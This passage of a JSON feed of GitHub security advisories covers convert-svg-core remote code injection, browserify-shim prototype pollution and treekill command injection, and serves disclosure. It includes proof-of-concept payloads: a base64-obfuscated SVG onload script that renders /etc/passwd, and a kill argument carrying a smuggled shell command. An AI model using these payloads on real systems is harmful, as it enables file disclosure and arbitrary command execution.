            "content_html": "<p>The package convert-svg-core before 0.6.2 is vulnerable to Remote Code Injection via sending an SVG file containing the payload in an <code>onload</code> attribute. Puppeteer/Chromium (used by convert-svg-core) will execute any code within that tag, including malicious code.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><strong>Payload</strong></p>\n<pre><code class=\"language-html\">&lt;svg onload=eval(atob(this.id)) id='ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs='&gt;&lt;/svg&gt;\n</code></pre>\n<p>where the <code>id</code> attribute is the base 64-encoded form of </p>\n<pre><code class=\"language-js\">document.write('&lt;svg-dummy&gt;&lt;/svg-dummy&gt;&lt;iframe src=\"file:///etc/passwd\" width=\"100%\" height=\"1000px\"&gt;&lt;/iframe&gt;&lt;svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"&gt;&lt;text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\"&gt;data&lt;/text&gt;&lt;/svg&gt;');\n</code></pre>\n<p><strong>Attack</strong></p>\n<pre><code class=\"language-js\">const { convert } = require('convert-svg-to-png');\nconst express = require('express');\nconst fileSvg = `[[[payload]]]`;\n// YWxlcnQoMSk=\n// function newContent(){document.open(),document.write('&lt;text x=\\\"0\\\" y=\\\"0\\\" class=\\\"Rrrrr\\\" id=\\\"demo\\\"&gt;data&lt;/text&gt;'),document.close()}\nconst app = express();\napp.get('/poc', async (req, res)=&gt;{\n  try {\n    const png = await convert(fileSvg);\n    res.set('Content-Type', 'image/png');\n    res.send(png);\n  } catch (e) {\n      console.log(e);\n    res.send(\"\");\n  }\n});\napp.listen(3000, ()=&gt;{\n  console.log('started');\n});\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25759\">https://nvd.nist.gov/vuln/detail/CVE-2022-25759</a></li>\n<li><a href=\"https://github.com/neocotic/convert-svg/issues/81\">https://github.com/neocotic/convert-svg/issues/81</a></li>\n<li><a href=\"https://github.com/neocotic/convert-svg/pull/82\">https://github.com/neocotic/convert-svg/pull/82</a></li>\n<li><a href=\"https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5\">https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633\">https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5gxc-fxcr-9326\">https://github.com/advisories/GHSA-5gxc-fxcr-9326</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5gxc-fxcr-9326",
            "title": "[convert-svg-core] convert-svg-core vulnerable to remote code injection",
            "date_modified": "2024-04-22T23:21:56.000Z",
            "date_published": "2022-07-23T00:00:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5gxc-fxcr-9326"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Prototype pollution vulnerability in function <code>resolveShims</code> in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the <code>k</code> variable in resolve-shims.js.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-37617\">https://nvd.nist.gov/vuln/detail/CVE-2022-37617</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/issues/245\">https://github.com/thlorenz/browserify-shim/issues/245</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L130\">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L130</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158\">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/pull/246\">https://github.com/thlorenz/browserify-shim/pull/246</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338\">https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-866w-wm4h-95c6\">https://github.com/advisories/GHSA-866w-wm4h-95c6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-866w-wm4h-95c6",
            "title": "[browserify-shim] thlorenz browserify-shim vulnerable to prototype pollution",
            "date_modified": "2024-04-22T23:21:00.000Z",
            "date_published": "2022-10-12T12:00:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-866w-wm4h-95c6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Prototype pollution vulnerability in function resolveShims in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the fullPath variable in resolve-shims.js.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-37621\">https://nvd.nist.gov/vuln/detail/CVE-2022-37621</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/issues/247\">https://github.com/thlorenz/browserify-shim/issues/247</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158\">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L37\">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L37</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/pull/246\">https://github.com/thlorenz/browserify-shim/pull/246</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338\">https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r737-347m-wqc7\">https://github.com/advisories/GHSA-r737-347m-wqc7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r737-347m-wqc7",
            "title": "[browserify-shim] thlorenz browserify-shim vulnerable to prototype pollution",
            "date_modified": "2024-04-22T23:20:56.000Z",
            "date_published": "2022-10-29T12:00:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r737-347m-wqc7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Prototype pollution vulnerability in function resolveShims in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the shimPath variable in resolve-shims.js.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-37623\">https://nvd.nist.gov/vuln/detail/CVE-2022-37623</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/issues/248\">https://github.com/thlorenz/browserify-shim/issues/248</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158\">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L94\">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L94</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/pull/246\">https://github.com/thlorenz/browserify-shim/pull/246</a></li>\n<li><a href=\"https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338\">https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cfgr-75jx-h88g\">https://github.com/advisories/GHSA-cfgr-75jx-h88g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cfgr-75jx-h88g",
            "title": "[browserify-shim] thlorenz browserify-shim vulnerable to prototype pollution",
            "date_modified": "2024-04-22T23:20:55.000Z",
            "date_published": "2022-10-31T19:00:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cfgr-75jx-h88g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Code Injection exists in treekill and tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command.</p>\n<h3 id=\"steps-to-reproduce\">Steps To Reproduce:</h3>\n<p>Create the following PoC file:</p>\n<pre><code class=\"language-js\">var kill = require('treekill');\nkill('3333332 &amp; echo \"HACKED\" &gt; HACKED.txt &amp; ');\n</code></pre>\n<p>Execute the following commands in terminal:</p>\n<pre><code class=\"language-shell\">npm i treekill # Install affected module\ndir # Check *HACKED.txt* doesn't exist\nnode poc.js #  Run the PoC\ndir # Now *HACKED.txt* exists :)\n</code></pre>\n<p>The HACKED.txt has been created</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15598\">https://nvd.nist.gov/vuln/detail/CVE-2019-15598</a></li>\n<li><a href=\"https://hackerone.com/reports/703415\">https://hackerone.com/reports/703415</a></li>\n<li><a href=\"https://github.com/pkrumins/node-tree-kill/issues/30\">https://github.com/pkrumins/node-tree-kill/issues/30</a></li>\n<li><a href=\"https://github.com/pkrumins/node-tree-kill/pull/31\">https://github.com/pkrumins/node-tree-kill/pull/31</a></li>\n<li><a href=\"https://github.com/pkrumins/node-tree-kill/commit/ff73dbf144c4c2daa67799a50dfff59cd455c63c\">https://github.com/pkrumins/node-tree-kill/commit/ff73dbf144c4c2daa67799a50dfff59cd455c63c</a></li>\n<li><a href=\"https://hackerone.com/reports/701183\">https://hackerone.com/reports/701183</a></li>\n<li><a href=\"https://github.com/node-modules/treekill/blob/master/index.js#L32\">https://github.com/node-modules/treekill/blob/master/index.js#L32</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-TREEKILL-536781\">https://security.snyk.io/vuln/SNYK-JS-TREEKILL-536781</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j7fq-p9q7-5wfv\">https://github.com/advisories/GHSA-j7fq-p9q7-5wfv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j7fq-p9q7-5wfv",
            "title": "[tree-kill] Treekill Enables OS Command Injection",
            "date_modified": "2024-04-22T23:20:00.000Z",
            "date_published": "2022-05-24T17:04:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j7fq-p9q7-5wfv"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}